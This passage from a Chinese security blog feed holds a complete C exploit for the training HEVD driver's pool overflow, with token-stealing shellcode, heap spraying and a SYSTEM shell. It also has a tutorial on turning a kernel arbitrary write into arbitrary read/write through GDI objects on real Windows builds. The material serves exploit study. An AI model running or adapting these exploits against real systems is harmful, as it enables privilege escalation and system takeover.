&quot;\x89\x91\xf8\x00\x00\x00&quot;      &#x2F;&#x2F; mov [ecx+0xf8],edx</span><br><span class="line">	&quot;\x61&quot;                          &#x2F;&#x2F; popad</span><br><span class="line"></span><br><span class="line">	&quot;\xC2\x10\x00&quot;                  &#x2F;&#x2F; ret 16</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HANDLE OpenDriver() &#123;</span><br><span class="line">	HANDLE hevd &#x3D; CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		0,</span><br><span class="line">		NULL,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">		NULL);</span><br><span class="line"></span><br><span class="line">	if (hevd &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		wprintf(L&quot;[-] Failed to open hevd\n&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		wprintf(L&quot;[+] Success to open hevd\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return hevd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char *payload &#x3D; (char *)malloc(0x1f8 + 40);</span><br><span class="line">	memset(payload, &#39;A&#39;, 0x1f8);</span><br><span class="line">    &#x2F;*</span><br><span class="line">	kd&gt; dd 8772cd08</span><br><span class="line">    8772cd08  04080008 ee657645 00000000 00000040</span><br><span class="line">    8772cd18  00000000 00000000 00000001 00000001</span><br><span class="line">    8772cd28  00000000 0008000c 87420a80 00000000</span><br><span class="line">    8772cd38  00040001 00000000 8772cd40 8772cd40</span><br><span class="line">	*&#x2F;</span><br><span class="line">	&#x2F;&#x2F; 伪造object type</span><br><span class="line">	char *temp &#x3D; payload + 0x1f8;</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x04080040;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0xee657645;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000000;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000040;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000000;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000000;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000001;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000001;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00000000;</span><br><span class="line">	temp &#x3D; (char *)((ULONG)temp + 0x4);</span><br><span class="line">	*(PULONG)temp &#x3D; (ULONG)0x00080000;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 写入shellcode到0地址</span><br><span class="line">	LPVOID ptr &#x3D; VirtualAlloc(0, sizeof(shellcode), 0x3000, 0x40);</span><br><span class="line">	RtlCopyMemory(ptr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">	HMODULE hmodule &#x3D; LoadLibraryA(&quot;ntdll.dll&quot;);</span><br><span class="line"></span><br><span class="line">	NtAllocateVirtualMemory_t NtAllocateVirtualMemory &#x3D; (NtAllocateVirtualMemory_t)GetProcAddress(hmodule, &quot;NtAllocateVirtualMemory&quot;);</span><br><span class="line"></span><br><span class="line">	if (NtAllocateVirtualMemory &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">		wprintf(L&quot;getprocaddress failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PVOID baseAddress &#x3D; (PVOID)1;</span><br><span class="line">	ULONG regionsize &#x3D; 0x100;</span><br><span class="line">	NTSTATUS status &#x3D; NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &amp;baseAddress, 0, &amp;regionsize, 0x3000, 0x40);</span><br><span class="line"></span><br><span class="line">	if (status !&#x3D; 0) &#123;</span><br><span class="line">		wprintf(L&quot;alloc failed,error code is:%u\n&quot;, status);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; 0x60地址处写入shellcode 位置，0x60 &#x3D; 0x28(TypeInfo在_object_type中的偏移) + 0x38(CloseProcedure在TypeInfo中的偏移)</span><br><span class="line">	if (!WriteProcessMemory((HANDLE)0xFFFFFFFF, (LPVOID)0x60, &amp;ptr, 0x4, NULL)) &#123;</span><br><span class="line">		wprintf(L&quot;write failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 堆风水</span><br><span class="line">	int i &#x3D; 0;</span><br><span class="line">	int j &#x3D; 0;</span><br><span class="line">	HANDLE spray1[10000];</span><br><span class="line">	HANDLE spray2[5000];</span><br><span class="line"></span><br><span class="line">	for (i &#x3D; 0; i &lt; 10000; i++) &#123;</span><br><span class="line">		spray1[i] &#x3D; CreateEventA(NULL, FALSE, FALSE, NULL);</span><br><span class="line">	&#125;</span><br><span class="line">	for (i &#x3D; 0; i &lt; 5000; i++) &#123;</span><br><span class="line">		spray2[i] &#x3D; CreateEventA(NULL, FALSE, FALSE, NULL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (i &#x3D; 0; i &lt; (sizeof(spray2) &#x2F; sizeof(HANDLE)); i &#x3D; i + 16) &#123;</span><br><span class="line">		for (j &#x3D; 0; j &lt; 8; j++) &#123;</span><br><span class="line">			CloseHandle(spray2[i + j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 触发shellcode</span><br><span class="line">	HANDLE hevd &#x3D; OpenDriver();</span><br><span class="line">	DWORD lpBytesReturned &#x3D; 0;</span><br><span class="line">	DeviceIoControl(hevd, 0x22200f, payload, 0x1f8 + 40, NULL, 0, &amp;lpBytesReturned, NULL);</span><br><span class="line"></span><br><span class="line">	for (i &#x3D; 8; i &lt; (sizeof(spray2) &#x2F; sizeof(HANDLE)); i &#x3D; i + 16) &#123;</span><br><span class="line">		for (j &#x3D; 0; j &lt; 8; j++) &#123;</span><br><span class="line">			CloseHandle(spray2[i + j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (i &#x3D; 0; i &lt; 10000; i++) &#123;</span><br><span class="line">		CloseHandle(spray1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	system(&quot;cmd.exe&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://50u1w4y.github.io/site/HEVD/nonPagedpooloverflow/">HEVD 非换页池溢出</a></li><li><a href="https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/">Windows Kernel Exploitation Tutorial Part 4: Pool Feng-Shui –&gt; Pool Overflow</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核利用——从任意地址写到任意地址读写</title>
    <url>/fdbd744b.html</url>
    <content><![CDATA[<blockquote><p>Windows内核利用：使用GDI结构从任意地址写到任意地址读写利用技术的攻防演进</p></blockquote><a id="more"></a><h2><span id="pqian-yan">前言</span><a href="#pqian-yan" class="header-anchor">#</a></h2><p>假设我们已经存在一个任意地址写任意值的内核漏洞，我们的最终目的是要实现提权。</p><p>这个时候我们就需要先回答这个问题：什么地址，写什么值可以让我们实现提权呢？</p><p>我们比较常用的方法是将exp进程的token地址替换为System进程的token地址，启动system cmd，因此这个问题也很好回答：</p><p>什么地址：exp进程的token地址</p><p>写什么值：System进程的token值</p><p>但是处于普通用户权限的exp进程并不能知道当前进程的token地址，也不知道System进程的token值，我们只有一个内核里的任意地址写任意值的漏洞。那什么东西可以让我们实现最终的提权呢？这就是本文的主要内容。</p><h2><span id="pwindows-dui-xiang">Windows对象</span><a href="#pwindows-dui-xiang" class="header-anchor">#</a></h2><p>Windows 中存在着 3 种类型的对象，分别为 user object、GDI object、Kernel object，一共有 40 多种对象</p><p>其中：</p><ul><li><p>bitmap对象属于 GDI object，存在于换页会话池中</p></li><li><p>Accelerator table 对象属于 user object，存在于换页会话池中</p></li><li><p>桌面堆对象属于 user object，存在于换页会话池中</p></li><li><p>Palette对象属于GDI object，存在于换页会话池中</p></li></ul><p>存在于同一会话池中的对象，可以通过堆风水的技术使得攻击者可以稳定的分配到同一块内存空间，实现内核地址的泄露</p><h2><span id="pbitmap-rs1-v1607-qian">BitMap RS1(v1607)前</span><a href="#pbitmap-rs1-v1607-qian" class="header-anchor">#</a></h2><h3><span id="pbitmap-jie-gou">BitMap结构</span><a href="#pbitmap-jie-gou" class="header-anchor">#</a></h3><p>BitMap是Windows GDI的一个对象，存在于内核中，可以帮助我们实现从任意地址写到任意地址读写。</p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png" alt="img" style="zoom:50%"><p>当新建一个BitMap对象时，会在内核中分配三个结构，分别是BaseObject,SURFObj和Pixel Data，其中SURFOBJ中的pvScan0指向Pixel Data，另外，用户态进程可以通过<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-getbitmapbits">GetBitmapBits</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-setbitmapbits">SetBitmapBits</a>来读写pvScan0指向的PixelData数据区 =&gt; 用户态进程可以操作内核数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT32</span> // 5 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG32 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG32 Tid;</span><br><span class="line"> &#125;BASEOBJECT32, *PBASEOBJECT32; </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT64</span> // 0<span class="title">x18</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG64 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG64 Tid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> BASEOBJECT32 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		hHmgr = base.hHmgr;</span><br><span class="line">		ulShareCount = base.ulShareCount;</span><br><span class="line">		cExclusiveLock = base.cExclusiveLock;</span><br><span class="line">		BaseFlags = base.cExclusiveLock;</span><br><span class="line">		Tid = base.Tid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> _BASEOBJECT64 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> ((hHmgr == base.hHmgr) &amp;&amp; (Tid == base.Tid));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">dump</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		dprint(<span class="string">"BASEOBJECT:\n"</span>);</span><br><span class="line">		dprint(<span class="string">"\thHmgr: %08lx\n"</span>, hHmgr);</span><br><span class="line">		dprint(<span class="string">"\tulShareCount: %08lx\n"</span>, ulShareCount);</span><br><span class="line">		dprint(<span class="string">"\tcExclusiveLock: %04lx\n"</span>, cExclusiveLock);</span><br><span class="line">		dprint(<span class="string">"\tBaseFlags: %04lx\n"</span>, BaseFlags);</span><br><span class="line">		dprint(<span class="string">"\tTid: %016I64x\n\n"</span>, Tid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;BASEOBJECT64, *PBASEOBJECT64;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ32</span> &#123;</span> pvScan0偏移<span class="number">0x20</span></span><br><span class="line">	ULONG32 dhsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32  hsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32 dhpdev;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32   hdev;  <span class="comment">// +4</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef struct tagSIZE</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            LONG        cx;</span></span><br><span class="line"><span class="comment">            LONG        cy;</span></span><br><span class="line"><span class="comment">        &#125; SIZE, *PSIZE, *LPSIZE;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        typedef SIZE               SIZEL;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">	ULONG  cjBits;   <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvBits; <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvScan0; </span><br><span class="line">	LONG   lDelta;</span><br><span class="line">	ULONG  iUniq;</span><br><span class="line">	ULONG  iBitmapFormat;</span><br><span class="line">	USHORT iType;</span><br><span class="line">	USHORT fjBitmap;</span><br><span class="line">&#125; SURFOBJ32 ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ64</span> &#123;</span> pvScan0偏移<span class="number">0x38</span></span><br><span class="line">	ULONG64  dhsurf; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hsurf;  <span class="comment">// +8</span></span><br><span class="line">	ULONG64  dhpdev; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hdev;   <span class="comment">// +8</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  cjBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvScan0;</span><br><span class="line">	LONG32  lDelta;</span><br><span class="line">	ULONG32  iUniq;</span><br><span class="line">	ULONG32  iBitmapFormat;</span><br><span class="line">	USHORT  iType;</span><br><span class="line">	USHORT  fjBitmap;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> SURFOBJ32 &amp;surf )</span><br><span class="line">	&#123;</span><br><span class="line">		dhsurf = surf.dhsurf;</span><br><span class="line">		hsurf = surf.hsurf;</span><br><span class="line">		dhpdev = surf.dhpdev;</span><br><span class="line">		hdev = surf.hdev;</span><br><span class="line">		sizlBitmap = surf.sizlBitmap;</span><br><span class="line">		cjBits = surf.cjBits;</span><br><span class="line">		pvBits = surf.pvBits;</span><br><span class="line">		pvScan0 = surf.pvScan0;</span><br><span class="line">		lDelta = surf.lDelta;</span><br><span class="line">		iUniq = surf.iUniq;</span><br><span class="line">		iBitmapFormat = surf.iBitmapFormat;</span><br><span class="line">		iType = surf.iType;</span><br><span class="line">		fjBitmap = surf.fjBitmap;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125; SURFOBJ64;</span><br></pre></td></tr></table></figure><h3><span id="pxie-lu-nei-he-xin-xi">泄露内核信息</span><a href="#pxie-lu-nei-he-xin-xi" class="header-anchor">#</a></h3><p>CreateBitmap 创建 Bitmap 对象后，会返回对应的资源句柄，该句柄的低16位是数组的访问下标</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UINT index &#x3D; hBitmap &amp; 0xFFFF;</span><br></pre></td></tr></table></figure><p>通过下标可以找到对应的GDI对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct _GDI_CELL GdiSharedHandleTable[0x8fff];</span><br><span class="line"></span><br><span class="line">struct _GDI_CELL</span><br><span class="line">&#123;</span><br><span class="line">    IntPtr pKernelAddress;</span><br><span class="line">    UInt16 wProcessId;</span><br><span class="line">    UInt16 wCount;</span><br><span class="line">    UInt16 wUpper;</span><br><span class="line">    UInt16 wType;</span><br><span class="line">    IntPtr pUserAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GdiSharedHandleTable</code>可以在用户态通过TEB-&gt;PEB-&gt;GdiSharedHandleTable获取到。<br>GDI_CELL结构在32位下大小为0x10，64位下为0x18。它的第一个指针 pKernelAddress 指向了 BASEOBJECT 的第一个字节</p><p>由于SURFACE OBJ结构体的偏移固定，可以泄露pvScan0的内核信息，过程如下：</p><p><code>pvScan0 = *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</code></p><p>此时，我们可以在用户态找到内核态的PvScan0地址</p><h3><span id="pdan-ci-ren-yi-di-zhi-xie-gt-dan-ci-ren-yi-di-zhi-du-xie">单次任意地址写 -&gt; 单次任意地址读写</span><a href="#pdan-ci-ren-yi-di-zhi-xie-gt-dan-ci-ren-yi-di-zhi-du-xie" class="header-anchor">#</a></h3><p>当我们有了一个任意地址写任意值的能力时，我们可以通过以下流程使用BITMAP进行利用</p><ol><li>新建BITMAP结构</li><li>用户态获取位于内核中的pvScan0地址</li><li>任意地址写漏洞改写 pvScan0 的值为我们想要读写的地址</li><li>使用GetBitMapBits和SetBitMapBits读写任意值</li></ol><p>但是上面的流程好像只比原来的漏洞多了一个读的能力，当漏洞只能触发一次时，一次读写根本不能满足我们想要达到的目的</p><h3><span id="pdan-ci-ren-yi-di-zhi-xie-gt-ren-yi-ci-ren-yi-di-zhi-du-xie">单次任意地址写 -&gt;任意次任意地址读写</span><a href="#pdan-ci-ren-yi-di-zhi-xie-gt-ren-yi-ci-ren-yi-di-zhi-du-xie" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png" alt="img"></p><p>通过两个BitMap的Manager + Worker模式，实现任意次任意地址读写，完全控制内核</p><ol><li>用户态新建Manager和Worker两个BitMap</li><li>使用任意地址写覆盖Manager的pvScan0为Worker的pvScan0地址</li><li>在用户态，操作Manager，可以替换Worker的pvScan0地址，再通过Worker来读写任意内存</li><li>通过任意地址读获取System进程的token</li><li>通过任意地址写替换当前进程token</li></ol><h2><span id="paccelerator-table-rs1-v1607">Accelerator Table RS1(v1607)</span><a href="#paccelerator-table-rs1-v1607" class="header-anchor">#</a></h2><blockquote><p>在RS1中，微软将pKernelAddress指向了异常地址，阻止了BitMap方式的pvScan0地址泄露</p></blockquote><p>可以想到的两个想法：</p><ol><li>寻找其它方法来泄露 bitmap GDI 对象的地址</li><li>寻找 bitmap 的替代方案</li></ol><h3><span id="pxie-lu-nei-he-di-zhi">泄露内核地址</span><a href="#pxie-lu-nei-he-di-zhi" class="header-anchor">#</a></h3><p>由于堆风水技术的存在，如果我们可以让BitMap分配到一个我们已知地址的空间，那么我们还是能泄露出pvScan0的地址，实现任意次的任意地址读写</p><ul><li><p>bitmap对象属于 GDI object，存在于换页会话池中</p></li><li><p>Accelerator table 对象属于 user object，存在于换页会话池中</p></li></ul><p>如果可以泄露Accelerator table的地址，再让BitMap分配到释放的Accelerator table的那块内存，就可以泄露pvScan0地址</p><p>泄露Accelerator table内核地址的结构体如下：</p><p>user32.dll 模块中有一个全局变量叫做 gSharedInfo，结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SHAREDINFO &#123;</span><br><span class="line">	PSERVERINFO psi;</span><br><span class="line">	PUSER_HANDLE_ENTRY aheList;</span><br><span class="line">	ULONG HeEntrySize;</span><br><span class="line">	ULONG_PTR pDispInfo;</span><br><span class="line">	ULONG_PTR ulSharedDelts;</span><br><span class="line">	ULONG_PTR awmControl;</span><br><span class="line">	ULONG_PTR DefWindowMsgs;</span><br><span class="line">	ULONG_PTR DefWindowSpecMsgs;</span><br><span class="line">&#125; SHAREDINFO, * PSHAREDINFO;</span><br></pre></td></tr></table></figure><p>其中第二个变量aheList指向一张结构为 USER_HANDLE_ENTRY 的表，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _USER_HANDLE_ENTRY &#123;</span><br><span class="line">	void* pKernel;</span><br><span class="line">	union</span><br><span class="line">	&#123;</span><br><span class="line">		PVOID pi;</span><br><span class="line">		PVOID pti;</span><br><span class="line">		PVOID ppi;</span><br><span class="line">	&#125;;</span><br><span class="line">	BYTE type;</span><br><span class="line">	BYTE flags;</span><br><span class="line">	WORD generation;</span><br><span class="line">&#125; USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;</span><br></pre></td></tr></table></figure><p>这里的pKernel指向对应的User Object在内核中的位置</p><h3><span id="pdui-feng-shui">堆风水</span><a href="#pdui-feng-shui" class="header-anchor">#</a></h3><ol><li>调整构造函数，使得创建的Accelerator Table对象和BitMap对象大小一致</li><li>使用Accelerator Table占位</li><li>释放Accelerator Table并分配BitMap，实现内存复用</li><li>根据偏移，计算出pvScan0内核地址</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvScan0 &#x3D; *(PDWORD32)pKernel + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</span><br></pre></td></tr></table></figure><h2><span id="plpszmenuname-rs2-v1703">lpszMenuName RS2(v1703)</span><a href="#plpszmenuname-rs2-v1703" class="header-anchor">#</a></h2><blockquote><p>在RS2中，Windows再次将pKernel指向异常地址，阻止了Accelerator Table + 堆风水泄露pvScan0的方式</p></blockquote><p>lpszMenuName关联一个<code>windows窗口对象</code>, 其在内核当中对应结构体对象为<code>tagWND</code></p><p>tagCLS对应于windows窗口类，其中一个对象是<code>lpszManuName</code></p><p>如果可以泄露<code>lpszManuName</code>地址，就可以通过设置<code>wndclass.lpszMenuName</code>控制对应内存的大小</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-01-21-113126.jpg" alt="img"></p><p><code>tagWND</code>对应一个<code>桌面堆</code>. 内核的桌面堆会映射到用户态去.。</p><h3><span id="pxie-lu-nei-he-di-zhi">泄露内核地址</span><a href="#pxie-lu-nei-he-di-zhi" class="header-anchor">#</a></h3><ul><li><p>bitmap对象属于 GDI object，存在于换页会话池中</p></li><li><p>桌面堆对象属于 user object，存在于换页会话池中</p></li></ul><p>使用桌面堆对象和堆风水泄露BitMap对象的pvScan0的内核地址。</p><p>桌面堆会在用户态和内核态各保存一份，我们通过下面的方式泄露桌面堆的内核地址</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-14-04-530966_FT7CWAP48N3PFBC.jpg" alt="img"></p><p>指向用户模式版本的指针被存在TEB.Win32ClientInfo+0x28的位置，ulClientDelta即是内核地址减去用户地址</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-14-04-530966_ZA3BVKAYTAK3EM9.jpg" alt="img"></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-14-04-530966_AAD46RYSP49S2QW.jpg" alt="img"></p><p>首先在用户态找到函数HMValidateHandle的地址</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; u user32!IsMenu</span><br><span class="line">USER32!IsMenu:</span><br><span class="line">00007fff&#96;17d489e0 4883ec28        sub     rsp,28h</span><br><span class="line">00007fff&#96;17d489e4 b202            mov     dl,2</span><br><span class="line">00007fff&#96;17d489e6 e805380000      call    USER32!HMValidateHandle (00007fff&#96;17d4c1f0)</span><br><span class="line">00007fff&#96;17d489eb 33c9            xor     ecx,ecx</span><br><span class="line">00007fff&#96;17d489ed 4885c0          test    rax,rax</span><br><span class="line">00007fff&#96;17d489f0 0f95c1          setne   cl</span><br><span class="line">00007fff&#96;17d489f3 8bc1            mov     eax,ecx</span><br><span class="line">00007fff&#96;17d489f5 4883c428        add     rsp,28h</span><br></pre></td></tr></table></figure><p>在用户态调用HmValidateHandle，可以返回一个用户桌面堆中的tagWND对象指针</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-14-04-RS2-Desktop5.jpg" alt="img"></p><p>具体泄露过程如下：</p><ol><li>从User32.dll中的IsMenu函数中找到HMValidateHandle函数的指针：<code>pIsMenu --&gt; pHMValidateHandle</code></li><li>通过调用HMValidateHandle函数找到用户桌面堆中的tagWND指针：<code>pWnd = HMValidateHandle(hWnd,1)</code></li><li>获取内核桌面堆地址：<code>pSelf=pWnd+0x20</code>，获取内核tagCLS地址：<code>kernelTagCLS=pWnd+0xa8</code>，这里的<code>pSelf</code>其实是Kernel中的<code>tagWND</code>地址</li><li>内核桌面堆和用户桌面堆的地址偏移：<code>ulClientDelta=pSelf-pWnd</code></li><li>获取用户态TagCLS:<code>userTagCLS=kernelTagCLS-ulClientDelta</code></li><li><code>lpszMenuName</code>位于<code>userTagCLS</code>0x90偏移处(该处指向paged pool中的lpszMenuName成员)</li></ol><h3><span id="pdui-feng-shui">堆风水</span><a href="#pdui-feng-shui" class="header-anchor">#</a></h3><ol><li>调整构造函数，使得创建的桌面堆对象的lpszMenuName和BitMap对象大小一致</li><li>使用桌面堆对象占位</li><li>释放桌面堆对象并分配BitMap，实现内存复用</li><li>根据偏移，计算出pvScan0内核地址</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvScan0 &#x3D; *(PDWORD32)pKernel + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</span><br></pre></td></tr></table></figure><h2><span id="ppalette-rs3-v1709">Palette RS3 (v1709)</span><a href="#ppalette-rs3-v1709" class="header-anchor">#</a></h2><blockquote><p>在RS3中，微软彻底解决了BitMap的问题，把Bitmap header与Bitmap data分离，无法通过Bitmap header取得pvscan0指针的内核地址</p></blockquote><h3><span id="ppalette-jie-gou">Palette结构</span><a href="#ppalette-jie-gou" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PALETTE64</span><br><span class="line">&#123;</span><br><span class="line">    BASEOBJECT64      BaseObject;    &#x2F;&#x2F; 0x00</span><br><span class="line">    FLONG           flPal;         &#x2F;&#x2F; 0x18</span><br><span class="line">    ULONG32           cEntries;      &#x2F;&#x2F; 0x1C</span><br><span class="line">    ULONG32           ulTime;        &#x2F;&#x2F; 0x20 </span><br><span class="line">    HDC             hdcHead;       &#x2F;&#x2F; 0x24</span><br><span class="line">    ULONG64        hSelected;     &#x2F;&#x2F; 0x28, </span><br><span class="line">    ULONG64           cRefhpal;      &#x2F;&#x2F; 0x30</span><br><span class="line">    ULONG64          cRefRegular;   &#x2F;&#x2F; 0x34</span><br><span class="line">    ULONG64      ptransFore;    &#x2F;&#x2F; 0x3c</span><br><span class="line">    ULONG64      ptransCurrent; &#x2F;&#x2F; 0x44</span><br><span class="line">    ULONG64      ptransOld;     &#x2F;&#x2F; 0x4C</span><br><span class="line">    ULONG32           unk_038;       &#x2F;&#x2F; 0x38</span><br><span class="line">    ULONG64         pfnGetNearest; &#x2F;&#x2F; 0x3c</span><br><span class="line">    ULONG64   pfnGetMatch;   &#x2F;&#x2F; 0x40</span><br><span class="line">    ULONG64           ulRGBTime;     &#x2F;&#x2F; 0x44</span><br><span class="line">    ULONG64       pRGBXlate;     &#x2F;&#x2F; 0x48</span><br><span class="line">    PALETTEENTRY    *pFirstColor;  &#x2F;&#x2F; 0x80</span><br><span class="line">    struct _PALETTE *ppalThis;     &#x2F;&#x2F; 0x88</span><br><span class="line">    PALETTEENTRY    apalColors[3]; &#x2F;&#x2F; 0x90</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PALETTEENTRY(Structure):</span><br><span class="line"> _fields_ &#x3D; [</span><br><span class="line">  (&quot;peRed&quot;, BYTE),</span><br><span class="line">  (&quot;peGreen&quot;, BYTE),</span><br><span class="line">  (&quot;peBlue&quot;, BYTE),</span><br><span class="line">  (&quot;peFlags&quot;, BYTE)</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>0x90处是一个4字节的数组apalColors，相当于BitMap里的pixel data，pFirstColor是一个指针，指向apalColors，相当于BitMap里的pvScan0。</p><ul><li><p>pvScan0 -&gt; pFirstColor</p></li><li><p>pixelData -&gt; apalColors</p></li></ul><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-13-04-t01eeece971d766ce7c.png" 